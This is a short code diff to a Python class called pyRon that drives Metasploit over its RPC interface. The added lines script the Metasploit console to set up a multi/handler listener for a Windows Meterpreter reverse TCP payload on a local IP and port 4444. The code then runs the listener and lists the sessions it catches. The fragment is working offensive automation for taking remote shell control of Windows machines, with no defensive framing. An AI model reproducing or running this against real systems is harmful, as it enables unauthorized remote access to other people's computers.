@@ -97,8 +97,22 @@ class pyRon:
         if self.msfclient.connect() is False:
             sys.exit()
 
-        # Only works if you load msgrpc with the correct parameters
-        # Params: Pass=password, Port=55553
+        # Testing sending commands to console to run
+        self.msfclient.console.write('use exploit/multi/handler')
+        time.sleep(2)
+        self.msfclient.console.write('use windows/meterpreter/reverse_tcp')
+        time.sleep(2)
+        self.msfclient.console.write('set LHOST 192.168.1.109')
+        time.sleep(2)
+        self.msfclient.console.write('set LPORT 4444')
+        time.sleep(2)
+        self.msfclient.console.write('set THREADS 20')
+        time.sleep(2)
+        self.msfclient.console.write('run')
+        time.sleep(10)
+
+        # Only works if you load msgrpc with the correct parameters using the framework
+        # Params: Pass=password, default port is 55552
         self.sessions = self.msfclient.client.sessions.list
         for s_id, s_info in self.sessions.items():
             print("\nSession ID: ", s_id)
